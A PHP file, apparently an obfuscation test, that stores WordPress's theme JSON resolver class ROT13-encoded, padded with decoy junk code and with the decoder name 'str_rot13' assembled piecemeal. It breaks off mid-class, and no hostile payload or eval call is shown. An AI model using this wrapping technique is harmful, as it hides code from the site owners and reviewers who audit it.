<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_Gurzr_WFBA_Erfbyire pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gurzr
 * @fvapr 5.8.0
 */

/**
 * Pynff gung nofgenpgf gur cebprffvat bs gur qvssrerag qngn fbheprf
 * sbe fvgr-yriry pbasvt naq bssref na NCV gb jbex jvgu gurz.
 *
 * Guvf pynff vf sbe vagreany pber hfntr naq vf abg fhccbfrq gb or hfrq ol rkgraqref (cyhtvaf naq/be gurzrf).
 * Guvf vf n ybj-yriry NCV gung znl arrq gb qb oernxvat punatrf. Cyrnfr,
 * hfr trg_tybony_frggvatf(), trg_tybony_fglyrf(), naq trg_tybony_fglyrfurrg() vafgrnq.
 *
 * @npprff cevingr
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Gurzr_WFBA_Erfbyire {

	/**
	 * Pbagnvare sbe xrrc genpx bs ertvfgrerq oybpxf.
	 *
	 * @fvapr 6.1.0
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $oybpxf_pnpur = neenl(
		'pber'   => neenl(),
		'oybpxf' => neenl(),
		'gurzr'  => neenl(),
		'hfre'   => neenl(),
	);

	/**
	 * Pbagnvare sbe qngn pbzvat sebz pber.
	 *
	 * @fvapr 5.8.0
	 * @ine JC_Gurzr_WFBA
	 */
	cebgrpgrq fgngvp $pber = ahyy;

	/**
	 * Pbagnvare sbe qngn pbzvat sebz gur oybpxf.
	 *
	 * @fvapr 6.1.0
	 * @ine JC_Gurzr_WFBA
	 */
	cebgrpgrq fgngvp $oybpxf = ahyy;

	/**
	 * Pbagnvare sbe qngn pbzvat sebz gur gurzr.
	 *
	 * @fvapr 5.8.0
	 * @ine JC_Gurzr_WFBA
	 */
	cebgrpgrq fgngvp $gurzr = ahyy;

	/**
	 * Pbagnvare sbe qngn pbzvat sebz gur hfre.
	 *
	 * @fvapr 5.9.0
	 * @ine JC_Gurzr_WFBA
	 */
	cebgrpgrq fgngvp $hfre = ahyy;

	/**
	 * Fgberf gur VQ bs gur phfgbz cbfg glcr
	 * gung ubyqf gur hfre qngn.
	 *
	 * @fvapr 5.9.0
	 * @ine vag
	 */
	cebgrpgrq fgngvp $hfre_phfgbz_cbfg_glcr_vq = ahyy;

	/**
	 * Pbagnvare gb xrrc ybnqrq v18a fpurzn sbe `gurzr.wfba`.
	 *
	 * @fvapr 5.8.0 Nf `$gurzr_wfba_v18a`.
	 * @fvapr 5.9.0 Eranzrq sebz `$gurzr_wfba_v18a` gb `$v18a_fpurzn`.
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $v18a_fpurzn = ahyy;

	/**
	 * `gurzr.wfba` svyr pnpur.
	 *
	 * @fvapr 6.1.0
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $gurzr_wfba_svyr_pnpur = neenl();

	/**
	 * Cebprffrf n svyr gung nqurerf gb gur gurzr.wfba fpurzn
	 * naq ergheaf na neenl jvgu vgf pbagragf, be n ibvq neenl vs abar sbhaq.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.1.0 Nqqrq pnpuvat.
	 *
	 * @cnenz fgevat $svyr_cngu Cngu gb svyr. Rzcgl vs ab svyr.
	 * @erghea neenl Pbagragf gung nqurer gb gur gurzr.wfba fpurzn.
	 */
	cebgrpgrq fgngvp shapgvba ernq_wfba_svyr( $svyr_cngu ) {
		vs ( $svyr_cngu ) {
			vs ( neenl_xrl_rkvfgf( $svyr_cngu, fgngvp::$gurzr_wfba_svyr_pnpur ) ) {
				erghea fgngvp::$gurzr_wfba_svyr_pnpur[ $svyr_cngu ];
			}

			$qrpbqrq_svyr = jc_wfba_svyr_qrpbqr( $svyr_cngu, neenl( 'nffbpvngvir' => gehr ) );
			vs ( vf_neenl( $qrpbqrq_svyr ) ) {
				fgngvp::$gurzr_wfba_svyr_pnpur[ $svyr_cngu ] = $qrpbqrq_svyr;
				erghea fgngvp::$gurzr_wfba_svyr_pnpur[ $svyr_cngu ];
			}
		}

		erghea neenl();
	}

	/**
	 * Ergheaf n qngn fgehpgher hfrq va gurzr.wfba genafyngvba.
	 *
	 * @fvapr 5.8.0
	 * @qrcerpngrq 5.9.0
	 *
	 * @erghea neenl Na neenl bs gurzr.wfba svryqf gung ner genafyngnoyr naq gur xrlf gung ner genafyngnoyr.
	 */
	choyvp fgngvp shapgvba trg_svryqf_gb_genafyngr() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '5.9.0' );
		erghea neenl();
	}

	/**
	 * Tvira n gurzr.wfba fgehpgher zbqvsvrf vg va cynpr gb hcqngr pregnva inyhrf
	 * ol vgf genafyngrq fgevatf nppbeqvat gb gur ynathntr frg ol gur hfre.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl  $gurzr_wfba Gur gurzr.wfba gb genafyngr.
	 * @cnenz fgevat $qbznva     Bcgvbany. Grkg qbznva. Havdhr vqragvsvre sbe ergevrivat genafyngrq fgevatf.
	 *                           Qrsnhyg 'qrsnhyg'.
	 * @erghea neenl Ergheaf gur zbqvsvrq $gurzr_wfba_fgehpgher.
	 */
	cebgrpgrq fgngvp shapgvba genafyngr( $gurzr_wfba, $qbznva = 'qrsnhyg' ) {
		vs ( ahyy === fgngvp::$v18a_fpurzn ) {
			$v18a_fpurzn         = jc_wfba_svyr_qrpbqr( __QVE__ . '/gurzr-v18a.wfba' );
			fgngvp::$v18a_fpurzn = ahyy === $v18a_fpurzn ? neenl() : $v18a_fpurzn;
		}

		erghea genafyngr_frggvatf_hfvat_v18a_fpurzn( fgngvp::$v18a_fpurzn, $gurzr_wfba, $qbznva );
	}

	/**
	 * Ergheaf pber'f bevtva pbasvt.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea JC_Gurzr_WFBA Ragvgl gung ubyqf pber qngn.
	 */
	choyvp fgngvp shapgvba trg_pber_qngn() {
		vs ( ahyy !== fgngvp::$pber && fgngvp::unf_fnzr_ertvfgrerq_oybpxf( 'pber' ) ) {
			erghea fgngvp::$pber;
		}

		$pbasvt = fgngvp::ernq_wfba_svyr( __QVE__ . '/gurzr.wfba' );
		$pbasvt = fgngvp::genafyngr( $pbasvt );

		/**
		 * Svygref gur qrsnhyg qngn cebivqrq ol JbeqCerff sbe tybony fglyrf & frggvatf.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz JC_Gurzr_WFBA_Qngn $gurzr_wfba Pynff gb npprff naq hcqngr gur haqreylvat qngn.
		 */
		$gurzr_wfba = nccyl_svygref( 'jc_gurzr_wfba_qngn_qrsnhyg', arj JC_Gurzr_WFBA_Qngn( $pbasvt, 'qrsnhyg' ) );

		/*
		 * Onpxjneq pbzcngvovyvgl sbe rkgraqref ergheavat n JC_Gurzr_WFBA_Qngn
		 * pbzcngvoyr pynff gung vf abg n JC_Gurzr_WFBA_Qngn bowrpg.
		 */
		vs ( $gurzr_wfba vafgnaprbs JC_Gurzr_WFBA_Qngn ) {
			fgngvp::$pber = $gurzr_wfba->trg_gurzr_wfba();
		} ryfr {
			$pbasvt       = $gurzr_wfba->trg_qngn();
			fgngvp::$pber = arj JC_Gurzr_WFBA( $pbasvt, 'qrsnhyg' );
		}

		erghea fgngvp::$pber;
	}

	/**
	 * Purpxf jurgure gur ertvfgrerq oybpxf jrer nyernql cebprffrq sbe guvf bevtva.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $bevtva Qngn fbhepr sbe juvpu gb pnpur gur oybpxf.
	 *                       Inyvq inyhrf ner 'pber', 'oybpxf', 'gurzr', naq 'hfre'.
	 * @erghea obby Gehr ba fhpprff, snyfr bgurejvfr.
	 */
	cebgrpgrq fgngvp shapgvba unf_fnzr_ertvfgrerq_oybpxf( $bevtva ) {
		// Onvy bhg vs gur bevtva vf vainyvq.
		vs ( ! vffrg( fgngvp::$oybpxf_pnpur[ $bevtva ] ) ) {
			erghea snyfr;
		}

		$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpxf   = $ertvfgel->trg_nyy_ertvfgrerq();

		// Vf gurer zrgnqngn sbe nyy pheeragyl ertvfgrerq oybpxf?
		$oybpx_qvss = neenl_qvss_xrl( $oybpxf, fgngvp::$oybpxf_pnpur[ $bevtva ] );
		vs ( rzcgl( $oybpx_qvss ) ) {
			erghea gehr;
		}

		sbernpu ( $oybpxf nf $oybpx_anzr => $oybpx_glcr ) {
			fgngvp::$oybpxf_pnpur[ $bevtva ][ $oybpx_anzr ] = gehr;
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf gur gurzr'f qngn.
	 *
	 * Qngn sebz gurzr.wfba jvyy or onpxsvyyrq sebz rkvfgvat
	 * gurzr fhccbegf, vs nal. Abgr gung vs gur fnzr qngn
	 * vf cerfrag va gurzr.wfba naq va gurzr fhccbegf,
	 * gur gurzr.wfba gnxrf cerprqrapr.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Gurzr fhccbegf unir orra vayvarq naq gur `$gurzr_fhccbeg_qngn` nethzrag erzbirq.
	 * @fvapr 6.0.0 Nqqrq na `$bcgvbaf` cnenzrgre gb nyybj gur gurzr qngn gb or erghearq jvgubhg gurzr fhccbegf.
	 * @fvapr 6.6.0 Nqq fhccbeg sbe 'qrsnhyg-sbag-fvmrf' naq 'qrsnhyg-fcnpvat-fvmrf' gurzr fhccbegf.
	 *              Nqqrq ertvfgengvba naq zretvat bs oybpx fglyr inevngvbaf sebz cnegvny gurzr.wfba svyrf naq gur oybpx fglyrf ertvfgel.
	 *
	 * @cnenz neenl $qrcerpngrq Qrcerpngrq. Abg hfrq.
	 * @cnenz neenl $bcgvbaf {
	 *     Bcgvbaf nethzragf.
	 *
	 *     @glcr obby $jvgu_fhccbegf Jurgure gb vapyhqr gurzr fhccbegf va gur qngn. Qrsnhyg gehr.
	 * }
	 * @erghea JC_Gurzr_WFBA Ragvgl gung ubyqf gurzr qngn.
	 */
	choyvp fgngvp shapgvba trg_gurzr_qngn( $qrcerpngrq = neenl(), $bcgvbaf = neenl() ) {
		vs ( ! rzcgl( $qrcerpngrq ) ) {
			_qrcerpngrq_nethzrag( __ZRGUBQ__, '5.9.0' );
		}

		$bcgvbaf = jc_cnefr_netf( $bcgvbaf, neenl( 'jvgu_fhccbegf' => gehr ) );

		vs ( ahyy === fgngvp::$gurzr || ! fgngvp::unf_fnzr_ertvfgrerq_oybpxf( 'gurzr' ) ) {
			$jc_gurzr        = jc_trg_gurzr();
			$gurzr_wfba_svyr = $jc_gurzr->trg_svyr_cngu( 'gurzr.wfba' );
			vs ( vf_ernqnoyr( $gurzr_wfba_svyr ) ) {
				$gurzr_wfba_qngn = fgngvp::ernq_wfba_svyr( $gurzr_wfba_svyr );
				$gurzr_wfba_qngn = fgngvp::genafyngr( $gurzr_wfba_qngn, $jc_gurzr->trg( 'GrkgQbznva' ) );
			} ryfr {
				$gurzr_wfba_qngn = neenl( 'irefvba' => JC_Gurzr_WFBA::YNGRFG_FPURZN );
			}

			/*
			 * Ertvfgre inevngvbaf qrsvarq ol gurzr cnegvnyf (gurzr.wfba svyrf va gur fglyrf qverpgbel).
			 * Guvf vf erdhverq fb gur inevngvbaf cnff fnavgvmngvba bs gurzr.wfba qngn.
			 */
			$inevngvbaf = fgngvp::trg_fglyr_inevngvbaf( 'oybpx' );
			jc_ertvfgre_oybpx_fglyr_inevngvbaf_sebz_gurzr_wfba_cnegvnyf( $inevngvbaf );

			/*
			 * Fbhepr inevngvbaf sebz gur oybpx ertvfgel naq oybpx fglyr inevngvba svyrf. Gura, zretr gurz vagb gur rkvfgvat gurzr.wfba qngn.
			 *
			 * Va pnfr gur fnzr fglyr cebcregvrf ner qrsvarq va frireny fbheprf, guvf vf ubj jr fubhyq erfbyir gur inyhrf,
			 * sebz uvture gb ybjre cevbevgl:
			 *
			 * - fglyrf.oybpxf.oybpxGlcr.inevngvbaf sebz gurzr.wfba
			 * - fglyrf.inevngvbaf sebz gurzr.wfba
			 * - inevngvbaf sebz oybpx fglyr inevngvba svyrf
			 * - inevngvbaf sebz oybpx fglyrf ertvfgel
			 *
			 * Frr grfg_nqq_ertvfgrerq_oybpx_fglyrf_gb_gurzr_qngn naq grfg_hajencf_oybpx_fglyr_inevngvbaf.
			 *
			 */
			$gurzr_wfba_qngn = fgngvp::vawrpg_inevngvbaf_sebz_oybpx_fglyr_inevngvba_svyrf( $gurzr_wfba_qngn, $inevngvbaf );
			$gurzr_wfba_qngn = fgngvp::vawrpg_inevngvbaf_sebz_oybpx_fglyrf_ertvfgel( $gurzr_wfba_qngn );

			/**
			 * Svygref gur qngn cebivqrq ol gur gurzr sbe tybony fglyrf naq frggvatf.
			 *
			 * @fvapr 6.1.0
			 *
			 * @cnenz JC_Gurzr_WFBA_Qngn $gurzr_wfba Pynff gb npprff naq hcqngr gur haqreylvat qngn.
			 */
			$gurzr_wfba = nccyl_svygref( 'jc_gurzr_wfba_qngn_gurzr', arj JC_Gurzr_WFBA_Qngn( $gurzr_wfba_qngn, 'gurzr' ) );

			/*
			 * Onpxjneq pbzcngvovyvgl sbe rkgraqref ergheavat n JC_Gurzr_WFBA_Qngn
			 * pbzcngvoyr pynff gung vf abg n JC_Gurzr_WFBA_Qngn bowrpg.
			 */
			vs ( $gurzr_wfba vafgnaprbs JC_Gurzr_WFBA_Qngn ) {
				fgngvp::$gurzr = $gurzr_wfba->trg_gurzr_wfba();
			} ryfr {
				$pbasvt        = $gurzr_wfba->trg_qngn();
				fgngvp::$gurzr = arj JC_Gurzr_WFBA( $pbasvt );
			}

			vs ( $jc_gurzr->cnerag() ) {
				// Trg cnerag gurzr.wfba.
				$cnerag_gurzr_wfba_svyr = $jc_gurzr->cnerag()->trg_svyr_cngu( 'gurzr.wfba' );
				vs ( $gurzr_wfba_svyr !== $cnerag_gurzr_wfba_svyr && vf_ernqnoyr( $cnerag_gurzr_wfba_svyr ) ) {
					$cnerag_gurzr_wfba_qngn = fgngvp::ernq_wfba_svyr( $cnerag_gurzr_wfba_svyr );
					$cnerag_gurzr_wfba_qngn = fgngvp::genafyngr( $cnerag_gurzr_wfba_qngn, $jc_gurzr->cnerag()->trg( 'GrkgQbznva' ) );
					$cnerag_gurzr           = arj JC_Gurzr_WFBA( $cnerag_gurzr_wfba_qngn );

					/*
					 * Zretr gur puvyq gurzr.wfba vagb gur cnerag gurzr.wfba.
					 * Gur puvyq gurzr gnxrf cerprqrapr bire gur cnerag.
					 */
					$cnerag_gurzr->zretr( fgngvp::$gurzr );
					fgngvp::$gurzr = $cnerag_gurzr;
				}
			}
		}

		vs ( ! $bcgvbaf['jvgu_fhccbegf'] ) {
			erghea fgngvp::$gurzr;
		}

		/*
		 * Jr jnag gur cerfrgf naq frggvatf qrpynerq va gurzr.wfba
		 * gb bireevqr gur barf qrpynerq ivn gurzr fhccbegf.
		 * Fb jr gnxr gurzr fhccbegf, genafsbez vg gb gurzr.wfba funcr
		 * naq zretr gur fgngvp::$gurzr hcba gung.
		 */
		$gurzr_fhccbeg_qngn = JC_Gurzr_WFBA::trg_sebz_rqvgbe_frggvatf( trg_pynffvp_gurzr_fhccbegf_oybpx_rqvgbe_frggvatf() );
		vs ( ! jc_gurzr_unf_gurzr_wfba() ) {
			/*
			 * Hayvxr oybpx gurzrf, pynffvp gurzrf jvgubhg n gurzr.wfba qvfnoyr
			 * qrsnhyg cerfrgf jura phfgbz cerfrg gurzr fhccbeg vf nqqrq. Guvf
			 * orunivbe pna or bireevqqra ol hfvat gur pbeerfcbaqvat qrsnhyg
			 * cerfrg gurzr fhccbeg.
			 */
			$gurzr_fhccbeg_qngn['frggvatf']['pbybe']['qrsnhygCnyrggr']        =
				! vffrg( $gurzr_fhccbeg_qngn['frggvatf']['pbybe']['cnyrggr'] ) ||
				pheerag_gurzr_fhccbegf( 'qrsnhyg-pbybe-cnyrggr' );
			$gurzr_fhccbeg_qngn['frggvatf']['pbybe']['qrsnhygTenqvragf']      =
				! vffrg( $gurzr_fhccbeg_qngn['frggvatf']['pbybe']['tenqvragf'] ) ||
				pheerag_gurzr_fhccbegf( 'qrsnhyg-tenqvrag-cerfrgf' );
			$gurzr_fhccbeg_qngn['frggvatf']['glcbtencul']['qrsnhygSbagFvmrf'] =
				! vffrg( $gurzr_fhccbeg_qngn['frggvatf']['glcbtencul']['sbagFvmrf'] ) ||
				pheerag_gurzr_fhccbegf( 'qrsnhyg-sbag-fvmrf' );
			$gurzr_fhccbeg_qngn['frggvatf']['fcnpvat']['qrsnhygFcnpvatFvmrf'] =
				! vffrg( $gurzr_fhccbeg_qngn['frggvatf']['fcnpvat']['fcnpvatFvmrf'] ) ||
				pheerag_gurzr_fhccbegf( 'qrsnhyg-fcnpvat-fvmrf' );

			/*
			 * Funqbj cerfrgf ner rkcyvpvgyl qvfnoyrq sbe pynffvp gurzrf hagvy n
			 * qrpvfvba vf znqr sbe jurgure gur qrsnhyg cerfrgf fubhyq zngpu gur
			 * bgure cerfrgf be vs gurl fubhyq or qvfnoyrq ol qrsnhyg va pynffvp
			 * gurzrf. Frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/vffhrf/59989.
			 */
			$gurzr_fhccbeg_qngn['frggvatf']['funqbj']['qrsnhygCerfrgf'] = snyfr;

			// Nyybj gurzrf gb ranoyr yvax pbybe frggvat ivn gurzr_fhccbeg.
			vs ( pheerag_gurzr_fhccbegf( 'yvax-pbybe' ) ) {
				$gurzr_fhccbeg_qngn['frggvatf']['pbybe']['yvax'] = gehr;
			}

			// Nyybj gurzrf gb ranoyr nyy obeqre frggvatf ivn gurzr_fhccbeg.
			vs ( pheerag_gurzr_fhccbegf( 'obeqre' ) ) {
				$gurzr_fhccbeg_qngn['frggvatf']['obeqre']['pbybe']  = gehr;
				$gurzr_fhccbeg_qngn['frggvatf']['obeqre']['enqvhf'] = gehr;
				$gurzr_fhccbeg_qngn['frggvatf']['obeqre']['fglyr']  = gehr;
				$gurzr_fhccbeg_qngn['frggvatf']['obeqre']['jvqgu']  = gehr;
			}

			// Nyybj gurzrf gb ranoyr nccrnenapr gbbyf ivn gurzr_fhccbeg.
			vs ( pheerag_gurzr_fhccbegf( 'nccrnenapr-gbbyf' ) ) {
				$gurzr_fhccbeg_qngn['frggvatf']['nccrnenaprGbbyf'] = gehr;
			}
		}
		$jvgu_gurzr_fhccbegf = arj JC_Gurzr_WFBA( $gurzr_fhccbeg_qngn );
		$jvgu_gurzr_fhccbegf->zretr( fgngvp::$gurzr );
		erghea $jvgu_gurzr_fhccbegf;
	}

	/**
	 * Trgf gur fglyrf sbe oybpxf sebz gur oybpx.wfba svyr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea JC_Gurzr_WFBA
	 */
	choyvp fgngvp shapgvba trg_oybpx_qngn() {
		$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpxf   = $ertvfgel->trg_nyy_ertvfgrerq();

		vs ( ahyy !== fgngvp::$oybpxf && fgngvp::unf_fnzr_ertvfgrerq_oybpxf( 'oybpxf' ) ) {
			erghea fgngvp::$oybpxf;
		}

		$pbasvt = neenl( 'irefvba' => JC_Gurzr_WFBA::YNGRFG_FPURZN );
		sbernpu ( $oybpxf nf $oybpx_anzr => $oybpx_glcr ) {
			vs ( vffrg( $oybpx_glcr->fhccbegf['__rkcrevzragnyFglyr'] ) ) {
				$pbasvt['fglyrf']['oybpxf'][ $oybpx_anzr ] = fgngvp::erzbir_wfba_pbzzragf( $oybpx_glcr->fhccbegf['__rkcrevzragnyFglyr'] );
			}

			vs (
				vffrg( $oybpx_glcr->fhccbegf['fcnpvat']['oybpxTnc']['__rkcrevzragnyQrsnhyg'] ) &&
				! vffrg( $pbasvt['fglyrf']['oybpxf'][ $oybpx_anzr ]['fcnpvat']['oybpxTnc'] )
			) {
				/*
				 * Rafher na rzcgl cynprubyqre inyhr rkvfgf sbe gur oybpx, vs vg cebivqrf n qrsnhyg oybpxTnc inyhr.
				 * Gur erny oybpxTnc inyhr gb or hfrq jvyy or qrgrezvarq jura gur fglyrf ner eraqrerq sbe bhgchg.
				 */
				$pbasvt['fglyrf']['oybpxf'][ $oybpx_anzr ]['fcnpvat']['oybpxTnc'] = ahyy;
			}
		}

		/**
		 * Svygref gur qngn cebivqrq ol gur oybpxf sbe tybony fglyrf & frggvatf.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz JC_Gurzr_WFBA_Qngn $gurzr_wfba Pynff gb npprff naq hcqngr gur haqreylvat qngn.
		 */
		$gurzr_wfba = nccyl_svygref( 'jc_gurzr_wfba_qngn_oybpxf', arj JC_Gurzr_WFBA_Qngn( $pbasvt, 'oybpxf' ) );

		/*
		 * Onpxjneq pbzcngvovyvgl sbe rkgraqref ergheavat n JC_Gurzr_WFBA_Qngn
		 * pbzcngvoyr pynff gung vf abg n JC_Gurzr_WFBA_Qngn bowrpg.
		 */
		vs ( $gurzr_wfba vafgnaprbs JC_Gurzr_WFBA_Qngn ) {
			fgngvp::$oybpxf = $gurzr_wfba->trg_gurzr_wfba();
		} ryfr {
			$pbasvt         = $gurzr_wfba->trg_qngn();
			fgngvp::$oybpxf = arj JC_Gurzr_WFBA( $pbasvt, 'oybpxf' );
		}

		erghea fgngvp::$oybpxf;
	}

	/**
	 * Jura tvira na neenl, guvf jvyy erzbir nal xrlf jvgu gur anzr `//`.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz neenl $vachg_neenl Gur neenl gb svygre.
	 * @erghea neenl Gur svygrerq neenl.
	 */
	cevingr fgngvp shapgvba erzbir_wfba_pbzzragf( $vachg_neenl ) {
		hafrg( $vachg_neenl['//'] );
		sbernpu ( $vachg_neenl nf $x => $i ) {
			vs ( vf_neenl( $i ) ) {
				$vachg_neenl[ $x ] = fgngvp::erzbir_wfba_pbzzragf( $i );
			}
		}

		erghea $vachg_neenl;
	}

	/**
	 * Ergheaf gur phfgbz cbfg glcr gung pbagnvaf gur hfre'f bevtva pbasvt
	 * sbe gur npgvir gurzr be na rzcgl neenl vs abar ner sbhaq.
	 *
	 * Guvf pna nyfb perngr naq erghea n arj qensg phfgbz cbfg glcr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_Gurzr $gurzr              Gur gurzr bowrpg. Vs rzcgl, vg
	 *                                     qrsnhygf gb gur npgvir gurzr.
	 * @cnenz obby     $perngr_cbfg        Bcgvbany. Jurgure n arj phfgbz cbfg
	 *                                     glcr fubhyq or perngrq vs abar ner
	 *                                     sbhaq. Qrsnhyg snyfr.
	 * @cnenz neenl    $cbfg_fgnghf_svygre Bcgvbany. Svygre phfgbz cbfg glcr ol
	 *                                     cbfg fgnghf. Qrsnhyg `neenl( 'choyvfu' )`,
	 *                                     fb vg bayl srgpurf choyvfurq cbfgf.
	 * @erghea neenl Phfgbz Cbfg Glcr sbe gur hfre'f bevtva pbasvt.
	 */
	choyvp fgngvp shapgvba trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr, $perngr_cbfg = snyfr, $cbfg_fgnghf_svygre = neenl( 'choyvfu' ) ) {
		vs ( ! $gurzr vafgnaprbs JC_Gurzr ) {
			$gurzr = jc_trg_gurzr();
		}

		/*
		 * Onvy rneyl vs gur gurzr qbrf abg fhccbeg n gurzr.wfba.
		 *
		 * Fvapr jc_gurzr_unf_gurzr_wfba() bayl fhccbegf gur npgvir
		 * gurzr, gur rkgen pbaqvgvba sbe jurgure $gurzr vf gur npgvir gurzr vf
		 * cerfrag urer.
		 */
		vs ( $gurzr->trg_fglyrfurrg() === trg_fglyrfurrg() && ! jc_gurzr_unf_gurzr_wfba() ) {
			erghea neenl();
		}

		$hfre_pcg         = neenl();
		$cbfg_glcr_svygre = 'jc_tybony_fglyrf';
		$fglyrfurrg       = $gurzr->trg_fglyrfurrg();
		$netf             = neenl(
			'cbfgf_cre_cntr'         => 1,
			'beqreol'                => 'qngr',
			'beqre'                  => 'qrfp',
			'cbfg_glcr'              => $cbfg_glcr_svygre,
			'cbfg_fgnghf'            => $cbfg_fgnghf_svygre,
			'vtaber_fgvpxl_cbfgf'    => gehr,
			'ab_sbhaq_ebjf'          => gehr,
			'hcqngr_cbfg_zrgn_pnpur' => snyfr,
			'hcqngr_cbfg_grez_pnpur' => snyfr,
			'gnk_dhrel'              => neenl(
				neenl(
					'gnkbabzl' => 'jc_gurzr',
					'svryq'    => 'anzr',
					'grezf'    => $fglyrfurrg,
				),
			),
		);

		$tybony_fglyr_dhrel = arj JC_Dhrel();
		$erprag_cbfgf       = $tybony_fglyr_dhrel->dhrel( $netf );
		vs ( pbhag( $erprag_cbfgf ) === 1 ) {
			$hfre_pcg = trg_bowrpg_inef( $erprag_cbfgf[0] );
		} ryfrvs ( $perngr_cbfg ) {
			$pcg_cbfg_vq = jc_vafreg_cbfg(
				neenl(
					'cbfg_pbagrag' => '{\"irefvba\": ' . JC_Gurzr_WFBA::YNGRFG_FPURZN . ', \"vfTybonyFglyrfHfreGurzrWFBA\": gehr }',
					'cbfg_fgnghf'  => 'choyvfu',
					'cbfg_gvgyr'   => 'Phfgbz Fglyrf', // Qb abg znxr fgevat genafyngnoyr, frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/54518.
					'cbfg_glcr'    => $cbfg_glcr_svygre,
					'cbfg_anzr'    => fcevags( 'jc-tybony-fglyrf-%f', heyrapbqr( $fglyrfurrg ) ),
					'gnk_vachg'    => neenl(
						'jc_gurzr' => neenl( $fglyrfurrg ),
					),
				),
				gehr
			);
			vs ( ! vf_jc_reebe( $pcg_cbfg_vq ) ) {
				$hfre_pcg = trg_bowrpg_inef( trg_cbfg( $pcg_cbfg_vq ) );
			}
		}

		erghea $hfre_pcg;
	}

	/**
	 * Ergheaf gur hfre'f bevtva pbasvt.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.6.0 Gur 'vfTybonyFglyrfHfreGurzrWFBA' synt vf yrsg ba gur hfre qngn.
	 *              Ertvfgre gur oybpx fglyr inevngvbaf pbzvat sebz gur hfre qngn.
	 *
	 * @erghea JC_Gurzr_WFBA Ragvgl gung ubyqf fglyrf sbe hfre qngn.
	 */
	choyvp fgngvp shapgvba trg_hfre_qngn() {
		vs ( ahyy !== fgngvp::$hfre && fgngvp::unf_fnzr_ertvfgrerq_oybpxf( 'hfre' ) ) {
			erghea fgngvp::$hfre;
		}

		$pbasvt   = neenl();
		$hfre_pcg = fgngvp::trg_hfre_qngn_sebz_jc_tybony_fglyrf( jc_trg_gurzr() );

		vs ( neenl_xrl_rkvfgf( 'cbfg_pbagrag', $hfre_pcg ) ) {
			$qrpbqrq_qngn = wfba_qrpbqr( $hfre_pcg['cbfg_pbagrag'], gehr );

			$wfba_qrpbqvat_reebe = wfba_ynfg_reebe();
			vs ( WFBA_REEBE_ABAR !== $wfba_qrpbqvat_reebe ) {
				jc_gevttre_reebe( __ZRGUBQ__, 'Reebe jura qrpbqvat n gurzr.wfba fpurzn sbe hfre qngn. ' . wfba_ynfg_reebe_zft() );
				/**
				 * Svygref gur qngn cebivqrq ol gur hfre sbe tybony fglyrf & frggvatf.
				 *
				 * @fvapr 6.1.0
				 *
				 * @cnenz JC_Gurzr_WFBA_Qngn $gurzr_wfba Pynff gb npprff naq hcqngr gur haqreylvat qngn.
				 */
				$gurzr_wfba = nccyl_svygref( 'jc_gurzr_wfba_qngn_hfre', arj JC_Gurzr_WFBA_Qngn( $pbasvt, 'phfgbz' ) );

				/*
				 * Onpxjneq pbzcngvovyvgl sbe rkgraqref ergheavat n JC_Gurzr_WFBA_Qngn
				 * pbzcngvoyr pynff gung vf abg n JC_Gurzr_WFBA_Qngn bowrpg.
				 */
				vs ( $gurzr_wfba vafgnaprbs JC_Gurzr_WFBA_Qngn ) {
					erghea $gurzr_wfba->trg_gurzr_wfba();
				} ryfr {
					$pbasvt = $gurzr_wfba->trg_qngn();
					erghea arj JC_Gurzr_WFBA( $pbasvt, 'phfgbz' );
				}
			}

			/*
			 * Irel vzcbegnag gb irevsl gung gur synt vfTybonyFglyrfHfreGurzrWFBA vf gehr.
			 * Vs vg'f abg gehr gura gur pbagrag jnf abg rfpncrq naq vf abg fnsr.
			 */
			vs (
				vf_neenl( $qrpbqrq_qngn ) &&
				vffrg( $qrpbqrq_qngn['vfTybonyFglyrfHfreGurzrWFBA'] ) &&
				$qrpbqrq_qngn['vfTybonyFglyrfHfreGurzrWFBA']
			) {
				hafrg( $qrpbqrq_qngn['vfTybonyFglyrfHfreGurzrWFBA'] );
				$pbasvt = $qrpbqrq_qngn;
			}
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-gurzr-wfba-erfbyire.cuc */
		$gurzr_wfba = nccyl_svygref( 'jc_gurzr_wfba_qngn_hfre', arj JC_Gurzr_WFBA_Qngn( $pbasvt, 'phfgbz' ) );

		/*
		 * Onpxjneq pbzcngvovyvgl sbe rkgraqref ergheavat n JC_Gurzr_WFBA_Qngn
		 * pbzcngvoyr pynff gung vf abg n JC_Gurzr_WFBA_Qngn bowrpg.
		 */
		vs ( $gurzr_wfba vafgnaprbs JC_Gurzr_WFBA_Qngn ) {
			fgngvp::$hfre = $gurzr_wfba->trg_gurzr_wfba();
